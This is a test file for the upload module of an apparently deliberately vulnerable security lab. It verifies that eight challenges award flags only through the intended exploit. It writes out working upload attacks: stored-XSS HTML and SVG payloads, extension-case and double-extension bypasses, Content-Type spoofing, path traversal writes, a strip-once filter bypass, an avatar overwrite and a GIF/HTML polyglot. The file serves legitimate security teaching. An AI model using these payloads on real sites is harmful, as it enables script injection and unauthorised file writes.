'use strict';
// Upload module: every challenge must be solvable by the documented technique
// and must NOT be solvable by a shortcut. Storing a file NEVER awards on its
// own: the flag fires only when the stored file is served inline with an
// executable content type and its script phones home through the beacon
// (POST /upload/beacon) carrying the per-session token issued for that
// challenge. One POST can never award two challenge ids.
const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');
const { bootLab, flagFromDb, capturedSet, FLAG_RE } = require('./helpers');

// The avatar-overwrite challenge mutates uploads/avatars/avatar-bob.png on
// disk. Snapshot the pristine bytes at load and reset to the text fixture
// before the exploit runs so the test is idempotent across re-runs in the
// same tree. The original PNG is restored afterwards so the working tree
// stays clean.
const AVATAR_BOB = path.join(__dirname, '..', 'uploads', 'avatars', 'avatar-bob.png');
const BOB_ORIGINAL = fs.readFileSync(AVATAR_BOB);
function resetBobAvatar() {
  fs.writeFileSync(AVATAR_BOB, 'BOB-ORIGINAL-AVATAR-v1\n');
}
function restoreBobAvatar() {
  fs.writeFileSync(AVATAR_BOB, BOB_ORIGINAL);
}

// Traversal exploits write outside uploads/ (repo root). Clean those up so
// the working tree stays clean.
const TREE_ROOT = path.join(__dirname, '..');
function cleanupEscapes() {
  for (const f of ['trav-escape.txt', 'sb-escape.txt']) {
    try { fs.unlinkSync(path.join(TREE_ROOT, f)); } catch { /* absent */ }
  }
}

// Local raw-binary client: the upload endpoints take raw request bytes, not
// forms. Same cookie-jar behavior as helpers.client, so session-scoped flag
// captures are visible to capturedSet().
function uploadClient(base) {
  let cookie = '';
  async function send(method, url, { body, headers } = {}) {
    const res = await fetch(base + url, {
      method,
      redirect: 'manual',
      headers: { ...(cookie ? { cookie } : {}), ...headers },
      body,
    });
    const set = res.headers.getSetCookie ? res.headers.getSetCookie() : [];
    for (const c of set) {
      const pair = c.split(';')[0];
      const name = pair.split('=')[0];
      cookie = cookie.split('; ').filter((p) => p && !p.startsWith(name + '=')).concat(pair).join('; ');
    }
    const text = await res.text();
    return { status: res.status, text, headers: res.headers };
  }
  return {
    get: (url, headers) => send('GET', url, { headers }),
    postRaw: (url, body, headers) => send('POST', url, { body, headers }),
  };
}

// The beacon token the module page issued for this challenge id in this
// student's session. Students bake it into the payload before uploading.
function beaconTokenFor(pageText, id) {
  const m = pageText.match(new RegExp('data-beacon="' + id + '">([0-9a-f]{32})'));
  assert.ok(m, 'beacon token for ' + id + ' not found on the module page');
  return m[1];
}

// An HTML payload whose script phones home: exactly what the served file's
// own script does in a real browser.
function htmlBeacon(id, file, token) {
  return `<html><body><script>fetch('/upload/beacon',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({id:${JSON.stringify(id)},file:${JSON.stringify(file)},token:${JSON.stringify(token)}})})</script></body></html>`;
}

// Same, as an SVG document (for the viewer challenges).
function svgBeacon(id, file, token) {
  return `<svg xmlns="http://www.w3.org/2000/svg"><script>fetch('/upload/beacon',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({id:${JSON.stringify(id)},file:${JSON.stringify(file)},token:${JSON.stringify(token)}})})</script></svg>`;
}

// Simulates what the served file's script does once the file is opened in a
// browser: the beacon call. Returns the response for assertion.
function phoneHome(c, id, file, token) {
  return c.postRaw('/upload/beacon', Buffer.from(JSON.stringify({ id, file, token })), { 'content-type': 'application/json' });
}

test('upload module', async (t) => {
  const { srv, dataDir } = await bootLab(t);
  t.after(restoreBobAvatar);
  t.after(cleanupEscapes);
  const flagOf = (id) => flagFromDb(dataDir, 'upload', id);
  const OCTET = { 'content-type': 'application/octet-stream' };
  const tokenOf = async (c, id) => beaconTokenFor((await c.get('/upload')).text, id);

  await t.test('module page renders, links resolve, no em dash', async () => {
    const c = uploadClient(srv.base);
    const { status, text } = await c.get('/upload');
    assert.equal(status, 200);
    assert.ok(!text.includes('\u2014'), 'em dash in page');
    assert.equal((text.match(/class="vuln-card"/g) || []).length, 8);
    assert.equal((text.match(FLAG_RE) || []).length, 0);
    for (const id of ['stored-xss', 'upload-double-ext', 'upload-case', 'upload-ctype', 'upload-traversal', 'upload-strip-once', 'upload-overwrite', 'upload-polyglot']) {
      assert.ok(text.includes(`id="${id}"`), `missing card ${id}`);
      if (id !== 'upload-traversal') {
        assert.ok(text.includes(`data-beacon="${id}"`), `missing beacon token for ${id}`);
      }
    }
    const avatar = await c.get('/upload/avatar/bob');
    assert.equal(avatar.status, 200, 'victim avatar route');
    const stored = await c.postRaw('/upload/mime-check?filename=mp-ping.png', Buffer.from('x'), { 'content-type': 'image/png' });
    assert.notEqual(stored.status, 404, 'mime-check route');
    const viewMiss = await c.get('/upload/view/no-such-file-xyz');
    assert.equal(viewMiss.status, 404, 'viewer route handles missing file');
  });

  await t.test('stored-xss: a one-byte .html file stores but cannot award; an executed beacon earns the flag', async () => {
    const c = uploadClient(srv.base);
    const token = await tokenOf(c, 'stored-xss');
    // The old cheat: a one-byte .html file used to award at upload time.
    const tiny = await c.postRaw('/upload?filename=tiny-x.html', Buffer.from('x'), OCTET);
    assert.equal(tiny.status, 200);
    assert.ok(!tiny.text.includes(flagOf('stored-xss')), 'storing earns nothing');
    const cheat = await phoneHome(c, 'stored-xss', 'tiny-x.html', token);
    assert.equal(cheat.status, 403, 'one byte cannot phone home');
    assert.ok(!cheat.text.includes(flagOf('stored-xss')));
    assert.deepEqual(await capturedSet(c), []);
    // A beacon with the wrong token fails too.
    const bad = await phoneHome(c, 'stored-xss', 'tiny-x.html', 'deadbeefdeadbeefdeadbeefdeadbeef');
    assert.equal(bad.status, 403, 'a forged token must not award');
    // A beacon naming a file this session never uploaded fails.
    const noPending = await phoneHome(c, 'stored-xss', 'never-uploaded.html', token);
    assert.equal(noPending.status, 403, 'no upload on record');

    // The honest flow: payload carries the beacon snippet; the served file
    // is opened (executable content type); its script phones home.
    const payload = htmlBeacon('stored-xss', 'xss-b.html', token);
    const hit = await c.postRaw('/upload?filename=xss-b.html', Buffer.from(payload), OCTET);
    assert.equal(hit.status, 200);
    assert.ok(!hit.text.includes(flagOf('stored-xss')), 'storing is not enough');
    const served = await c.get('/uploads/xss-b.html');
    assert.equal(served.status, 200);
    assert.ok(String(served.headers.get('content-type')).includes('text/html'));
    assert.ok(served.text.includes(token), 'the served file carries the beacon token');
    const beacon = await phoneHome(c, 'stored-xss', 'xss-b.html', token);
    assert.equal(beacon.status, 200);
    assert.ok(beacon.text.includes(flagOf('stored-xss')));
    assert.ok((await capturedSet(c)).includes('upload:Stored XSS via file upload'));
  });

  await t.test('ext-blacklist: the case bypass earns its own id only, through the beacon', async () => {
    const c = uploadClient(srv.base);
    const token = await tokenOf(c, 'upload-case');
    const blocked = await c.postRaw('/upload/ext-blacklist?filename=evil-case.svg', Buffer.from('<svg></svg>'), OCTET);
    assert.equal(blocked.status, 400);
    assert.ok(!blocked.text.includes(flagOf('upload-case')));
    // A scriptless .SVG stores but cannot phone home.
    const plain = await c.postRaw('/upload/ext-blacklist?filename=plain-b.SVG', Buffer.from('<svg></svg>'), OCTET);
    assert.equal(plain.status, 200);
    const noScript = await phoneHome(c, 'upload-case', 'plain-b.SVG', token);
    assert.equal(noScript.status, 403, 'no executable content, no token in the file');
    assert.ok(!noScript.text.includes(flagOf('upload-case')));

    const payload = svgBeacon('upload-case', 'case-b.SVG', token);
    const hit = await c.postRaw('/upload/ext-blacklist?filename=case-b.SVG', Buffer.from(payload), OCTET);
    assert.equal(hit.status, 200);
    assert.ok(!hit.text.includes(flagOf('upload-case')), 'storing is not enough');
    assert.ok(!hit.text.includes(flagOf('upload-double-ext')), 'no cross award at store time');
    const view = await c.get('/upload/view/case-b.SVG');
    assert.equal(view.status, 200);
    assert.ok(String(view.headers.get('content-type')).includes('image/svg+xml'));
    const beacon = await phoneHome(c, 'upload-case', 'case-b.SVG', token);
    assert.equal(beacon.status, 200);
    assert.ok(beacon.text.includes(flagOf('upload-case')));
    assert.ok(!beacon.text.includes(flagOf('upload-double-ext')), 'the case beacon must not award the sibling id');
    assert.deepEqual((await capturedSet(c)).filter((s) => s.startsWith('upload:')), ['upload:Case-sensitive blacklist bypass']);
    // Same file, sibling challenge id: the bypass shape does not match.
    const cross = await phoneHome(c, 'upload-double-ext', 'case-b.SVG', await tokenOf(c, 'upload-double-ext'));
    assert.equal(cross.status, 403, 'case-b.SVG is not a double extension');
  });

  await t.test('ext-blacklist: shell.svg.jpg earns its own id only, through the beacon', async () => {
    const c = uploadClient(srv.base);
    const token = await tokenOf(c, 'upload-double-ext');
    const plain = await c.postRaw('/upload/ext-blacklist?filename=plain-b.jpg', Buffer.from('fakejpg'), OCTET);
    assert.equal(plain.status, 200);
    assert.ok(!plain.text.includes(flagOf('upload-double-ext')));
    const noExec = await phoneHome(c, 'upload-double-ext', 'plain-b.jpg', token);
    assert.equal(noExec.status, 403, 'a plain jpg is not served as executable content');

    const payload = svgBeacon('upload-double-ext', 'shell-b.svg.jpg', token);
    const hit = await c.postRaw('/upload/ext-blacklist?filename=shell-b.svg.jpg', Buffer.from(payload), OCTET);
    assert.equal(hit.status, 200);
    assert.ok(!hit.text.includes(flagOf('upload-double-ext')), 'storing is not enough');
    assert.ok(!hit.text.includes(flagOf('upload-case')), 'no cross award at store time');
    const view = await c.get('/upload/view/shell-b.svg.jpg');
    assert.equal(view.status, 200);
    assert.ok(String(view.headers.get('content-type')).includes('image/svg+xml'));
    const beacon = await phoneHome(c, 'upload-double-ext', 'shell-b.svg.jpg', token);
    assert.equal(beacon.status, 200);
    assert.ok(beacon.text.includes(flagOf('upload-double-ext')));
    assert.ok(!beacon.text.includes(flagOf('upload-case')), 'the double-ext beacon must not award the sibling id');
    assert.ok((await capturedSet(c)).includes('upload:Extension blacklist bypass'));
    // Same file, sibling challenge id: the bypass shape does not match.
    const cross = await phoneHome(c, 'upload-case', 'shell-b.svg.jpg', await tokenOf(c, 'upload-case'));
    assert.equal(cross.status, 403, 'shell.svg.jpg ends in .jpg, not a case variant');
  });

  await t.test('mime-check: html without image header is blocked, spoofed header stores, execution beacons', async () => {
    const c = uploadClient(srv.base);
    const token = await tokenOf(c, 'upload-ctype');
    const blocked = await c.postRaw('/upload/mime-check?filename=ctype-a.html', Buffer.from('<script>alert(1)</script>'), { 'content-type': 'text/html' });
    assert.equal(blocked.status, 400);
    assert.ok(!blocked.text.includes(flagOf('upload-ctype')));
    const benign = await c.postRaw('/upload/mime-check?filename=ctype-b.png', Buffer.from('PNGDATA'), { 'content-type': 'image/png' });
    assert.equal(benign.status, 200);
    assert.ok(!benign.text.includes(flagOf('upload-ctype')), 'a real image upload must not award');

    const payload = htmlBeacon('upload-ctype', 'ctype-c.html', token);
    const hit = await c.postRaw('/upload/mime-check?filename=ctype-c.html', Buffer.from(payload), { 'content-type': 'image/png' });
    assert.equal(hit.status, 200);
    assert.ok(!hit.text.includes(flagOf('upload-ctype')), 'storing is not enough');
    const view = await c.get('/upload/view/ctype-c.html');
    assert.equal(view.status, 200);
    assert.ok(String(view.headers.get('content-type')).includes('text/html'));
    const beacon = await phoneHome(c, 'upload-ctype', 'ctype-c.html', token);
    assert.equal(beacon.status, 200);
    assert.ok(beacon.text.includes(flagOf('upload-ctype')));
  });

  await t.test('traverse: the write alone gives nothing; the read-back proves the escape', async () => {
    const c = uploadClient(srv.base);
    const inside = await c.postRaw('/upload/traverse?filename=trav-inside.txt', Buffer.from('inside'), OCTET);
    assert.equal(inside.status, 200);
    assert.ok(!inside.text.includes(flagOf('upload-traversal')));
    const proveInside = await c.get('/upload/traverse-prove?f=trav-inside.txt');
    assert.equal(proveInside.status, 403, 'a file inside the dropbox must not award');

    const hit = await c.postRaw('/upload/traverse?filename=../trav-escape.txt', Buffer.from('escaped-by-test'), OCTET);
    assert.equal(hit.status, 200);
    assert.ok(!hit.text.includes(flagOf('upload-traversal')), 'the write alone earns nothing');
    // The plain read endpoint serves the escaped bytes but still earns nothing.
    const back = await c.get('/upload/traversed?f=../trav-escape.txt');
    assert.equal(back.status, 200);
    assert.ok(back.text.includes('escaped-by-test'));
    assert.ok(!back.text.includes(flagOf('upload-traversal')));
    // The prove endpoint awards only on the proven round trip.
    const prove = await c.get('/upload/traverse-prove?f=../trav-escape.txt');
    assert.equal(prove.status, 200);
    assert.ok(prove.text.includes(flagOf('upload-traversal')));
    assert.ok((await capturedSet(c)).includes('upload:Path traversal on write'));
    // A fresh session cannot prove with a name it never uploaded.
    const other = uploadClient(srv.base);
    const cheat = await other.get('/upload/traverse-prove?f=../trav-escape.txt');
    assert.equal(cheat.status, 403, 'no upload on record for this session');
    assert.ok(!(await capturedSet(other)).includes('upload:Path traversal on write'));
  });

  await t.test('filter: strip-neutered names give nothing; the rebuilt file beacons', async () => {
    const c = uploadClient(srv.base);
    const token = await tokenOf(c, 'upload-strip-once');
    const neutered = await c.postRaw('/upload/filter?filename=strip-plain.svg', Buffer.from('<svg></svg>'), OCTET);
    assert.equal(neutered.status, 200);
    assert.ok(!neutered.text.includes(flagOf('upload-strip-once')), 'stripped name must not award');

    const payload = svgBeacon('upload-strip-once', 'strip-b.svg', token);
    const hit = await c.postRaw('/upload/filter?filename=strip-b.s.svgvg', Buffer.from(payload), OCTET);
    assert.equal(hit.status, 200);
    assert.ok(!hit.text.includes(flagOf('upload-strip-once')), 'storing is not enough');
    const view = await c.get('/upload/view/strip-b.svg');
    assert.equal(view.status, 200);
    assert.ok(String(view.headers.get('content-type')).includes('image/svg+xml'));
    const beacon = await phoneHome(c, 'upload-strip-once', 'strip-b.svg', token);
    assert.equal(beacon.status, 200);
    assert.ok(beacon.text.includes(flagOf('upload-strip-once')));
  });

  await t.test('avatar: overwrite without execution gives nothing; the served script earns the flag', async () => {
    resetBobAvatar();
    const c = uploadClient(srv.base);
    const token = await tokenOf(c, 'upload-overwrite');
    const before = await c.get('/upload/avatar/bob');
    assert.equal(before.status, 200);
    assert.ok(before.text.includes('BOB-ORIGINAL-AVATAR-v1'));
    const other = await c.postRaw('/upload/avatar?user=alice', Buffer.from('ALICE-BYTES'), OCTET);
    assert.equal(other.status, 200);
    assert.ok(!other.text.includes(flagOf('upload-overwrite')), 'own avatar must not award');
    // Overwrite with scriptless bytes: stored, but served as an image, so it cannot phone home.
    const plain = await c.postRaw('/upload/avatar?user=bob', Buffer.from('NOT-HTML-BYTES'), OCTET);
    assert.equal(plain.status, 200);
    const noExec = await phoneHome(c, 'upload-overwrite', 'bob', token);
    assert.equal(noExec.status, 403, 'bytes without script are not served as executable content');
    assert.ok(!noExec.text.includes(flagOf('upload-overwrite')));
    assert.deepEqual((await capturedSet(c)).filter((s) => s.startsWith('upload:')), []);

    resetBobAvatar();
    const payload = htmlBeacon('upload-overwrite', 'bob', token);
    const hit = await c.postRaw('/upload/avatar?user=bob', Buffer.from(payload), OCTET);
    assert.equal(hit.status, 200);
    assert.ok(!hit.text.includes(flagOf('upload-overwrite')), 'storing is not enough');
    const after = await c.get('/upload/avatar/bob');
    assert.ok(after.text.includes(token));
    assert.ok(String(after.headers.get('content-type')).includes('text/html'), 'replaced avatar is sniffed as html');
    const beacon = await phoneHome(c, 'upload-overwrite', 'bob', token);
    assert.equal(beacon.status, 200);
    assert.ok(beacon.text.includes(flagOf('upload-overwrite')));
    assert.ok((await capturedSet(c)).includes('upload:Avatar overwrite'));
  });

  await t.test('polyglot: non-gif blocked, gif without html gives nothing, full polyglot earns the flag', async () => {
    const c = uploadClient(srv.base);
    const token = await tokenOf(c, 'upload-polyglot');
    const blocked = await c.postRaw('/upload/polyglot?filename=poly-a.gif', Buffer.from('not a gif at all'), OCTET);
    assert.equal(blocked.status, 400);
    const plain = await c.postRaw('/upload/polyglot?filename=poly-b.gif', Buffer.from('GIF89aplain-bytes'), OCTET);
    assert.equal(plain.status, 200);
    assert.ok(!plain.text.includes(flagOf('upload-polyglot')), 'gif header without html must not award');

    const payload = 'GIF89a<html><body>' + `<script>fetch('/upload/beacon',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({id:'upload-polyglot',file:'poly-c.gif',token:${JSON.stringify(token)}})})</script>` + '</body></html>';
    const hit = await c.postRaw('/upload/polyglot?filename=poly-c.gif', Buffer.from(payload), OCTET);
    assert.equal(hit.status, 200);
    assert.ok(!hit.text.includes(flagOf('upload-polyglot')), 'storing is not enough');
    const rendered = await c.get('/upload/poly/poly-c.gif');
    assert.equal(rendered.status, 200);
    assert.ok(String(rendered.headers.get('content-type')).includes('text/html'));
    assert.ok(rendered.text.includes('<script>'));
    const beacon = await phoneHome(c, 'upload-polyglot', 'poly-c.gif', token);
    assert.equal(beacon.status, 200);
    assert.ok(beacon.text.includes(flagOf('upload-polyglot')));
    assert.ok((await capturedSet(c)).includes('upload:GIF/HTML polyglot'));
  });

  await t.test('oversized upload is rejected with 413', async () => {
    const c = uploadClient(srv.base);
    const big = Buffer.alloc(2 * 1024 * 1024 + 1, 'a');
    const r = await c.postRaw('/upload?filename=big.bin', big, OCTET);
    assert.equal(r.status, 413);
  });

  await t.test('scoreboard counts each captured challenge once', async () => {
    const c = uploadClient(srv.base);

    // stored-xss
    const t1 = await tokenOf(c, 'stored-xss');
    await c.postRaw('/upload?filename=sb.html', Buffer.from(htmlBeacon('stored-xss', 'sb.html', t1)), OCTET);
    await c.get('/uploads/sb.html');
    assert.ok((await phoneHome(c, 'stored-xss', 'sb.html', t1)).text.includes(flagOf('stored-xss')));

    // upload-case
    const t2 = await tokenOf(c, 'upload-case');
    await c.postRaw('/upload/ext-blacklist?filename=sb.SVG', Buffer.from(svgBeacon('upload-case', 'sb.SVG', t2)), OCTET);
    await c.get('/upload/view/sb.SVG');
    assert.ok((await phoneHome(c, 'upload-case', 'sb.SVG', t2)).text.includes(flagOf('upload-case')));

    // upload-double-ext
    const t3 = await tokenOf(c, 'upload-double-ext');
    await c.postRaw('/upload/ext-blacklist?filename=sb.svg.jpg', Buffer.from(svgBeacon('upload-double-ext', 'sb.svg.jpg', t3)), OCTET);
    await c.get('/upload/view/sb.svg.jpg');
    assert.ok((await phoneHome(c, 'upload-double-ext', 'sb.svg.jpg', t3)).text.includes(flagOf('upload-double-ext')));

    // upload-ctype
    const t4 = await tokenOf(c, 'upload-ctype');
    await c.postRaw('/upload/mime-check?filename=sb2.html', Buffer.from(htmlBeacon('upload-ctype', 'sb2.html', t4)), { 'content-type': 'image/png' });
    await c.get('/upload/view/sb2.html');
    assert.ok((await phoneHome(c, 'upload-ctype', 'sb2.html', t4)).text.includes(flagOf('upload-ctype')));

    // upload-traversal
    await c.postRaw('/upload/traverse?filename=../sb-escape.txt', Buffer.from('x'), OCTET);
    assert.ok((await c.get('/upload/traverse-prove?f=../sb-escape.txt')).text.includes(flagOf('upload-traversal')));

    // upload-strip-once
    const t6 = await tokenOf(c, 'upload-strip-once');
    await c.postRaw('/upload/filter?filename=sb.s.svgvg', Buffer.from(svgBeacon('upload-strip-once', 'sb.svg', t6)), OCTET);
    await c.get('/upload/view/sb.svg');
    assert.ok((await phoneHome(c, 'upload-strip-once', 'sb.svg', t6)).text.includes(flagOf('upload-strip-once')));

    // upload-overwrite
    resetBobAvatar();
    const t7 = await tokenOf(c, 'upload-overwrite');
    await c.postRaw('/upload/avatar?user=bob', Buffer.from(htmlBeacon('upload-overwrite', 'bob', t7)), OCTET);
    await c.get('/upload/avatar/bob');
    assert.ok((await phoneHome(c, 'upload-overwrite', 'bob', t7)).text.includes(flagOf('upload-overwrite')));

    // upload-polyglot
    const t8 = await tokenOf(c, 'upload-polyglot');
    await c.postRaw('/upload/polyglot?filename=sb.gif', Buffer.from('GIF89a' + htmlBeacon('upload-polyglot', 'sb.gif', t8)), OCTET);
    await c.get('/upload/poly/sb.gif');
    assert.ok((await phoneHome(c, 'upload-polyglot', 'sb.gif', t8)).text.includes(flagOf('upload-polyglot')));

    const got = (await capturedSet(c)).filter((s) => s.startsWith('upload:'));
    assert.equal(got.length, 8);
    assert.deepEqual([...got].sort(), [
      'upload:Avatar overwrite',
      'upload:Case-sensitive blacklist bypass',
      'upload:Content-Type header spoofing',
      'upload:Extension blacklist bypass',
      'upload:GIF/HTML polyglot',
      'upload:Path traversal on write',
      'upload:Stored XSS via file upload',
      'upload:Strip-once filter bypass',
    ]);
  });
});
